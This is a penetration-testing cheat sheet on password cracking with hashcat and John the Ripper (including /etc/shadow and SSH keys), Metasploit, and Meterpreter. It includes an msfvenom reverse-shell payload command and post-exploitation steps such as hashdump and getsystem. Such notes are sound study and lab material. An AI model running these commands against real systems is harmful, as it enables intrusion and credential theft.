# Penetration testing

- [SecList](https://github.com/danielmiessler/SecLists) - collection of multiple types of lists used during security assessments

## Vulnerabilities and Exploits

- [CVE program](https://www.cve.org/) - dictionary of vulnerabilities
- [Exploit database](https://www.exploit-db.com/) - database of exploits for targetting vulnerabilities

## Password cracking

Trick to crack hashes without salts

1. **Check if hash is in rainbow table**
2. **If not, identify hash format (MD5, SHA-1, SHA-256, SHA-512 ...etc)**
3. **Use John the Ripper or hashcat against the hash**

**1. Cracking passwords without salts using rainbow tables:**

- [CrackStation](https://crackstation.net/) - rainbow table
- [Hashes.com](https://hashes.com/en/decrypt/hash) - rainbow table

**2. Identify hash format:**

Automatic identification, might not always work:

- [hashID](https://pypi.org/project/hashID/)
- [Hashes.com hash identifier](https://hashes.com/en/tools/hash_identifier)

Manual identification:

- [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

**3. Crack passwords with wordlists:**

- `hashcat` - basic usage: `hashcat -a 0 hash.txt wordlist.txt -m 900`. This would use attack mode 0 (try all words from wordlist one by one), try to crack hash in file hash.txt using words from wordlist.txt. It uses mode 900 which tells hashcat to crack `md4` hash.

- `john` - A.k.a John the ripper. Use Jumbo John distro for modern tools.

## John the Ripper

### Crack basic hashes

`john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt` - crack hash without knowing format. Doesn't always work

`john --format=[format] --wordlist=[path to wordlist] [path to file]` - crack known hash format

Typical formats:

`raw-MD5` = non-salted MD5 hashes
`nt` = NTLM

### Crack /etc/shadow hashes

`unshadow [path to /etc/passwd line] [path to /etc/shadow line]` - unshadow, i.e. populate /etc/passwd `x`-field

`john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt` - crack unshadowed hash

### Single crack mode

`john --single --format=[format] [path to file]` - use single crack mode using word mangling, not wordlist. Hash has to be in the form `user:hash`.

### Create custom rules for word mangling:

[rule syntax in John wiki](https://www.openwall.com/john/doc/RULES.shtml)

John conf file is located in `/opt/john/john.conf` in Kali Linux.

Adding rules to conf file will make them available for john. Use the rules like this:

`john --wordlist=[path to wordlist] --rule=[path to file]`

#### Rule adding example:

Let's say the target system has this password policy:

    - Lowercase letter
    - Uppercase letter
    - Number
    - Symbol

Knowing people typically comply with this policy like this: `Targetpassword1!`, allows custom rules to exploit **password complexity predictability**.

So the custom rule added to `john.conf` would be this:

    [List.Rules:targetpassword]

    cAz"[0-9] [!£$%@]"

Above uses the following:

    c: Capitalises the first letter
    Az: Appends to the end of the word
    [0-9]: A number in the range 0-9
    [!£$%@]: The password is followed by one of these symbols

### Conversion tools - Zip2John, Rar2John, SSH2John

Cracking password protected `.zip`, `.rar` or `id_rsa` (SSH private key file) files. Syntax with this is pretty much the same.

#### Step 1 - convert zip/rar/id_rsa file to hash file

.zip (Options are usually not necessary):

`zip2john [options] [zip file] > [output file]`

.rar:

`rar2john [rar file] > [output file]`

id_rsa:

`ssh2john [id_rsa private key file] > [output file]`

#### Step 2 - crack the hash using wordlist

`john --wordlist=[wordlist.txt] zip/rar/id_rsa_hash.txt`

## Metasploit

An exploitation framework. Has commercial GUI version **Metasploit Pro** and FOSS CLI version **Metasploit Framework**

### Different command prompts while using Metasploit

- Regular: `root@ip-10-10-XX-XX:~#`
- msfconsole: `msf6 >`
- Context prompt: `msf6 exploit(windows/smb/ms17_010_eternalblue) >`
- Meterpreter prompt: `meterpreter >`
- Target system shell: `C:\Windows\system32>`

### Commands

`msfconsole` - Open Metasploit Framework console

`search type:[moduleType] [keyword]` - Search for modules, CVE numbers, exploit names (eternalblue, heartbleed), target system. Type is optional. Example: `search type:auxiliary telnet` will search for auxiliary modules for telnet.

`msfvenom --list payloads` - show all payloads

`use [module]` - Change context to a module. Example: `use exploit/windows/smb/ms17_010_eternalblue`

`use [integer]` - Use module number returned by search command. Example: `use 0`.

`show options` - Print module's options, used inside a context.

`set [parameter_name] [value]` - Set module option parameter value

`unset [parameter_name]` or `unset all` - Clear parameter values

`setg [parameter_name] [value]` - Set global parameter value (for all modules) `unsetg` will unset them. Global values are cleared on Metasploit exit.

`show payloads` - List module compatible payloads

`info` - Show module info inside context

`info [module]` - Show module info

`back` - Leave context

`exploit` or `run` - Run current module. Use `-z` to background the opened session right after.

`sessions` - List active sessions

`sessions -i [number]` - interact with session

#### Setting up database connection and workspace

`systemctl start postgresql` - start postgresql database

`sudo -u postgres msfdb init` - initialize msf database. Needs to be run as non-root user, e.g. postgres.

`sudo -u postgres msfdb delete` - delete msf database

`workspace -a [name]` - add new workspace

`workspace -a [name]` - delete workspace

`db_nmap` - do nmap scan and save results to workspace db

`help` - when msf db is active, help will show more commands like `db_nmap`

`hosts` - show hosts in workspace. `-R` equals `setg RHOSTS [host IPs in db]` `-h` for help

`services` - show services in workspace. `-S [keyword]` for search. `-h` for help

#### Creating custom payloads with msfvenom

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f elf > rev_shell.elf` - create payload for Linux

`msfvenom --list payloads` - show all payloads

### Low hanging fruits

**HTTP**: Could host a web application with vulns like
SQL injection or RCE.

**FTP**: Could allow anonymous login and provide access to files.

**SMB**: Could be vulnerable to SMB exploits like MS17-010

**SSH**: Could have default or easy to guess credentials

**RDP**: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.

### Meterpreter

`help` - always type help to see what commands are available. Changes depending on version.

`getuid` - Display current user. Useful for checking privilege level.

`ps` - list running processes

`migrate` - migrate meterpreter to another process. Migrating to process started by lower privileged user might lose meterpreter privileges.

`search -f [filename]` - search for files.

`shell` - start regular command line shell on target system

`hashdump` - list content of SAM (Security Account Manager) db to see user's NTLM hashes.

`getsystem` - attempt to elevate privileges to that of local system

`load [tool name]` - load tool. Using `help` will now show more options.

### Modules

Modules are located in: `/opt/metasploit-framework/embedded/framework/modules`

Often used parameters:

        RHOSTS: "Remote host". Target systems IP.
        RPORT: "Remote port". Target systems vulnerable app's port number.
        PAYLOAD: Payload to use.
        LHOST: Local host IP.
        LPORT: Port for reverse shell.
        SESSION: Session's ID. Used for post-exploitation modules connecting to target system.

#### Auxiliary

        Any supporting module, such as scanners, crawlers and fuzzers

#### Encoders

        Encode exploit/payload to deceive signature-based (hash) AVs

#### Evasion

        Evade AVs that check for more than file hash

#### Exploits

        Code that exploits a vulnerability to get inside a system. Organized by target system (e.g. andoird, apple_ios, windows)

#### Payloads

        Code that runs on the exploited system. E.g. get a shell, run a command etc.

#### NOPs

        No OPeration. Tell CPU do nothing for one cycle. Used to pad payloads for consistent sizes.

#### Post

        Used during final stage of pentesting, post-exploitation.
